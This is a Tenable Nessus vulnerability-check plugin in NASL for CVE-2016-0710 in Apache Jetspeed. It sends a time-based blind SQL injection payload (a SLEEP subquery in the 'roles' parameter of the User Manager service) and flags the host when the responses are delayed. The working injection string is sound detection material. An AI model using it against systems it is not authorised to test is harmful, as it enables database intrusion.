#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(90248);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2017/02/03 20:48:27 $");

  script_cve_id("CVE-2016-0710");
  script_osvdb_id(135885);

  script_name(english:"Apache Jetspeed User Manager Service SQLi");
  script_summary(english:"Attempts to exploit a SQL injection vulnerability.");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Apache Jetspeed application running on the remote host is affected
by a SQL injection vulnerability in the User Manager service due to
improper sanitization of user-supplied input to the 'user' and 'role'
parameters. An unauthenticated, remote attacker can exploit this to
inject SQL queries, resulting in the manipulation of the back-end
database or the disclosure of information.

Note that Apache Jetspeed is reported to be affected by other
vulnerabilities as well; however, Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"https://portals.apache.org/jetspeed-2/security-reports.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to Apache Jetspeed version 2.3.1 when it becomes available.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Jetspeed Arbitrary File Upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/03/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/03/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:jetspeed");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016-2017 Tenable Network Security, Inc.");

  script_dependencies("apache_jetspeed_detect.nbin");
  script_require_keys("installed_sw/Apache Jetspeed");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Apache Jetspeed";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8080);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

stimes = make_list(3, 9, 15);
num_queries = max_index(stimes);
vuln = FALSE;

for (i = 0; i < max_index(stimes); i++)
{
  http_set_read_timeout(stimes[i] + 10);
  then = unixtime();

  url = "/services/usermanager/users/?";
  sqli ="roles=foo%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(" + stimes[i] + ")))foo)%20AND%20%27bar%27%3D%27bar";

  res = http_send_recv3(
    method       : "GET",
    port         : port,
    item         : dir + url + sqli,
    exit_on_fail : TRUE
  );

  now = unixtime();
  ttime = now - then;

  time_per_query += 'Query #' + (i+1) + ' : ' + query + ' Sleep Time : ' +
  stimes[i] + ' secs  Response Time : ' + ttime + ' secs\n';

  overalltime += ttime;
  if ( (ttime >= stimes[i]) && (ttime <= (stimes[i] + 5)) )
  {
    vuln = TRUE;

    output =
      'Blind SQL Injection Results' +
      '\n  Query                          : (SELECT * FROM (SELECT(sleep(' +stimes[i]+ ')))foo)' +
      '\n  Response time                  : ' + ttime + ' secs' +
      '\n  Number of queries executed     : ' + num_queries +
      '\n  Total test time                : ' + overalltime + ' secs' +
      '\n  Time per query                 : ' +
      '\n'+ "  " + time_per_query;

    continue;
  }
  else
    vuln = FALSE;
}

if (vuln)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(build_url(port:port, qs:dir + url + sqli)),
    output     : output
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
